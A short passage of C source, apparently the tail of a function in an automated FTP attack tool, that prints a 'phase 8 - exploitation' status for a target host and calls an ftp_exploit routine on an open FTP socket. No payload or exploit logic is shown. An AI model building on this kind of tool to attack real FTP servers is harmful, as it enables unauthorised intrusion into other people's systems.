           printf("%s: phase 8 - exploitation...  \n", hostip);
   #endif
       ftp_exploit (ftpsock);

       return (vuln);


   }
